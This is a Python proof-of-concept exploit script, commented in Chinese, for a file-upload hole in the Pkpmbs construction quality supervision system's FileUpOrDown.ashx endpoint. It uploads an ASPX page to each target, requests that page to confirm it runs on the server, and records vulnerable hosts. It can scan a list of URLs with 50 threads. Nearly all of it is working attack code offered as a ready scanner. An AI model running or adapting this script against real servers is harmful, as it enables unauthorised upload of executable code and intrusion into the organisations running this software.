# Pkpmbs建设工程质量监督系统FileUpOrDown.ashx文件上传漏洞
import argparse
from multiprocessing.dummy import Pool
import requests
import sys,re
requests.packages.urllib3.disable_warnings()

#定义横幅


def banner():
    banner = """
██╗    ██╗ █████╗ ████████╗███████╗██████╗ ███╗   ███╗███████╗██╗      ██████╗ ███╗   ██╗
██║    ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝██║     ██╔═══██╗████╗  ██║
██║ █╗ ██║███████║   ██║   █████╗  ██████╔╝██╔████╔██║█████╗  ██║     ██║   ██║██╔██╗ ██║
██║███╗██║██╔══██║   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║     ██║   ██║██║╚██╗██║
╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║███████╗███████╗╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                       
                                                author:watermelon_xz🍉
                            version:Pkpmbs建设工程质量监督系统FileUpOrDown.ashx文件上传漏洞
"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="Pkpmbs建设工程质量监督系统FileUpOrDown.ashx文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = '/Applications/Forms/SearchSetting/FileUpOrDown.ashx?operation=Fileupload&extName=.aspx&&searchConfigName=5B56bf.aspx'
    url = target+payload
    headers = {
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
            'Content-Length':'405',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language':'zh-CN,zh;q=0.9',
            'Connection':'close',
            'Content-Type':'multipart/form-data; boundary=----WebKitFormBoundarybqACRhAMBHmQQAUP',
            'Accept-Encoding':'gzip, deflate',
         }
    data = (
        '''
------WebKitFormBoundarybqACRhAMBHmQQAUP
Content-Disposition: form-data; name="Filedata"; filename="indexlist.aspx"
Content-Type: image/png

e165421110ba03099a1c0393373c5b43
<%@ Page Language="C#" Debug="true" %>
<%@ import Namespace="System"%>
<%@ import Namespace="System.IO"%>
<% string pageName = Request.PhysicalPath;%>
<% File.Delete(pageName);%>
------WebKitFormBoundarybqACRhAMBHmQQAUP--
'''
    )
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    #请求网页
    try:
        re1 = requests.post(url=url,headers=headers,data=data,verify=False,proxies=proxies)
        # print(re1.text)
        if re1.status_code == 200 and '/Excel' in re1.text:
            # print(f'[+++]该{target}存在Pkpmbs建设工程质量监督系统FileUpOrDown.ashx文件上传漏洞')
            payload_str=re.findall('/Excel/Templete/(.*?).aspx',re1.text,re.S)
            payload1=payload_str[0]
            url1=target+'/Excel/Templete/'+payload1+'.aspx'
            # print(url1)
            re2= requests.get(url=url1,verify=False,proxies=proxies)
            # print(re2.text)
            if re2.status_code==200 and 'e165421110ba03099a1c0393373c5b43' in re2.text:
                print(f'[+++]{target}存在Pkpmbs建设工程质量监督系统FileUpOrDown.ashx文件上传漏洞\n文件上传后地址为{url1}')
                with open('result.txt',mode='a',encoding='utf-8')as ft:
                    ft.write(target+'\n')
                return True 
        else:
            print(f'该{target}不存在该漏洞')
    except:
        print(f'该{target}存在问题，请手动测试')


if __name__ == '__main__':
    main()